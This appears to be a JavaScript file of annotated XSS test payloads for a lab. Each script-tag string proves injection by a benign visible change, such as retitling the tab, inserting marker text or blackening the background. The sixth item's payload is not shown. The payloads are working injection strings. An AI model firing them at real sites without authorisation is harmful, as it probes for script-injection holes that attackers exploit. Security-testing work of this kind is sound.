// 1. Change the browser tab's page title.
// document.title represents the current HTML document's <title>.
// After execution, the browser tab will show "XSS-TEST".
const payload = '<script>document.title="XSS-TEST"</script>';


// 2. Same idea, but using a different marker.
// Useful in a lab because you can immediately recognize that
// your injected JavaScript was executed.
const payload = '<script>document.title="B1-SUCCESS"</script>';


// 3. Insert visible text at the beginning of the page body.
// document.body represents the page's <body>.
// insertAdjacentText("afterbegin", ...) inserts plain text
// immediately after the opening <body> tag.
// The page will therefore display "XSS EXECUTED" near the top.
const payload = '<script>document.body.insertAdjacentText("afterbegin","XSS EXECUTED")</script>';


// 4. Find the first <h1> element and replace its text.
// document.querySelector("h1") finds the first matching <h1>.
// .textContent changes the text inside that element.
// This requires the target page to actually contain an <h1>.
const payload = '<script>document.querySelector("h1").textContent="XSS TEST"</script>';


// 5. Change the background of the page.
// document.body.style accesses the CSS styles of the <body>.
// Setting background to "black" makes the page background black.
// This is another visual proof that JavaScript executed.
const payload = '<script>document.body.style.background="black"</script>';


// 6. Perform two harmless DOM changes.
// First: change the browser tab title to "XSS".
// Second: insert "EXECUTED" at the beginning of the page.
// The semicolon separates the two JavaScript statements.
